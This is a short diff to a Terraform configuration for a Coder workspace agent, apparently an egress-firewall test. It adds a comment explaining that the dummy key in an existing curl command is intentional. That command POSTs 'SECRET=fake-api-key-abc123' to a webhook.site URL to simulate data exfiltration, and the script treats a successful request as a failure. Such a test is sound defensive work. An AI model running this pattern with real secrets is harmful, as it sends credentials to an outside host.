@@ -477,6 +477,9 @@ resource "coder_agent" "main" {
     set -e
     UUID="$(uuidgen 2>/dev/null || date +%s)"
     echo "Attempting POST to https://webhook.site/$UUID ..."
+    # NOTE: `fake-api-key-abc123` is an INTENTIONAL dummy payload for the
+    # egress-firewall exfiltration test (it proves the firewall blocks the
+    # POST). It is not a real credential — do not flag it as a leaked secret.
     curl -sS -X POST -d 'SECRET=fake-api-key-abc123' "https://webhook.site/$UUID"
     echo
     echo "Unexpected: POST succeeded. Is boundary installed and in PATH?"
